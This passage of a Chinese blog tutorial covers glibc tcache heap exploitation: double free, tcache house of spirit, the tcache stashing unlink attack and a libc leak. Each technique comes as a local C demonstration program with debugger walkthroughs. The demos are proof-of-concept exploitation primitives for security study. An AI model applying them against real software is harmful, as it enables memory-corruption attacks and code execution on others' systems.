+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//释放的chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//判断下标是否符合</span></span><br><span class="line">  <span class="comment">//链表的替换</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//数量增加</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，这里知识简单的链表插入，它并没有进行判断。</p>
+<p>之后直接进行申请，我们就可以拿到同一块地址的两个指针。</p>
+<h2 id="3-tcache-house-of-spirit"><a href="#3-tcache-house-of-spirit" class="headerlink" title="3.tcache house of spirit"></a>3.tcache house of spirit</h2><p>tcache house of spirit这种利用方式是由于tcache_put()函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的malloc指针，<strong>如果我们构造一个size符合tcache bin size的fake_chunk</strong>，那么理论上讲其实可以将任意地址作为chunk进行释放。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, b);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还是比较好理解的。</p>
+<p>我们来看一下第一次断点。</p>
+<p><img src="/2021/03/08/tcache/image-20210314215452014.png" alt="image-20210314215452014"></p>
+<p>第一次只有<code>tcache_perthread_struct</code>和我们申请的堆块</p>
+<p>看第二次断点</p>
+<p><img src="/2021/03/08/tcache/image-20210314215557280.png" alt="image-20210314215557280"></p>
+<p>bins中出现了栈上的地址，这时我们分配一下，就可以拿到栈上的指针了。</p>
+<p><img src="/2021/03/08/tcache/image-20210314215657530.png" alt="image-20210314215657530"></p>
+<p>栈上的指针到手。</p>
+<h2 id="4-tcache-stashing-unlink-attack"><a href="#4-tcache-stashing-unlink-attack" class="headerlink" title="4.tcache stashing unlink attack"></a>4.tcache stashing unlink attack</h2><p>首先从名字就可以看出这种方法与unlink有关，这种攻击利用的是tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中，这种情况可以使用calloc分配同大小堆块触发，因为calloc分配堆块时不从tcache bin中选取。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。当攻击者可以修改一个small bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake_chunk到任意地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_var addr is:%p\n"</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk_lis addr is:%p\n"</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"target addr is:%p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>具体来看一下这个过程，先看这三个地址。</p>
+<p><img src="/2021/03/08/tcache/image-20210318152451146.png" alt="image-20210318152451146"></p>
+<p>先c一下，6个放入tcache</p>
+<p><img src="/2021/03/08/tcache/image-20210318153644695.png" alt="image-20210318153644695"></p>
+<p>再c，观察bins结构</p>
+<p><img src="/2021/03/08/tcache/image-20210318153928275.png" alt="image-20210318153928275"></p>
+<p>c两下，可以看到两个tcache已经分配了</p>
+<p><img src="/2021/03/08/tcache/image-20210318154115014.png" alt="image-20210318154115014"></p>
+<p>可以看到栈上的地址已经上了cache链，直接分配就行了</p>
+<p><img src="/2021/03/08/tcache/image-20210318154918326.png" alt="image-20210318154918326"></p>
+<blockquote>
+<p>为什么会这样？</p>
+<p>先看这个smallbin的结构</p>
+<p><img src="/2021/03/08/tcache/image-20210318164858035.png" alt="image-20210318164858035"></p>
+<p>之后我们把2的bk指针改为栈上的地址。</p>
+<p>calloc之后就成为了这样</p>
+<p><img src="/2021/03/08/tcache/image-20210318165216882.png" alt="image-20210318165216882"></p>
+<p>这里说明一下为什么要使用calloc进行申请chunk，这是<strong>因为calloc在申请chunk的时候不会从tcache bin中摘取空闲块</strong>，如果这里使用malloc的话就会直接从tcache bin中获得空闲块了。那么在calloc申请size为0xa0大小的chunk的时候就会直接从small bin中获取，那么由于small bin是FIFO先进先出机制，所以这里被重新启用的是chunk[0]</p>
+<p>这个时候就到了前面理论部分描述的内容了：在获取到一个smallbin中的一个 chunk 后会如果 tcache 仍有足够空闲位置（tcache中有两个位置，chunk[2]和stack_var刚好够落在这两个位置），剩下的 smallbin 从最后一个 stack_var开始顺着bk链接到 tcachebin 中 ，在这个过程中<strong>只对第一个 chunk[2]进行了完整性检查，后面的stack_var的检查缺失</strong>。这样一来就造成上图的效果，stack_var就被挂进了tcache bin的链表中</p>
+<p><strong>同时这里还写入了一个libc，位于0x00007fffffffded0+0x10</strong></p>
+<p><img src="/2021/03/08/tcache/image-20210318174356049.png" alt="image-20210318174356049"></p>
+</blockquote>
+<h2 id="5-libc-leak"><a href="#5-libc-leak" class="headerlink" title="5.libc leak"></a>5.libc leak</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2021/03/06/house-of%E7%B3%BB%E5%88%97/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2021/03/21/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Blog
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Tag
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              About
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+    <div id="comment" class="vcomment" ></div>
+    <script>
+        var notify = 'true' == true ? true : false;
+        var verify = 'true' == true ? true : false;
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+            return GUEST_INFO.indexOf(item) > -1
+        });
+        guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+        window.valine = new Valine({
+            el: '.vcomment',
+            notify: notify,
+            verify: verify,
+            appId: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
+            appKey: "FL93w3BBbF9lxiR8X1HI58En",
+            avatar:'wavatar',
+            placeholder: "Just go go",
+            guest_info:guest_info,
+            pageSize:'6'
+        });
+    </script>
+  
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<!-- <script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
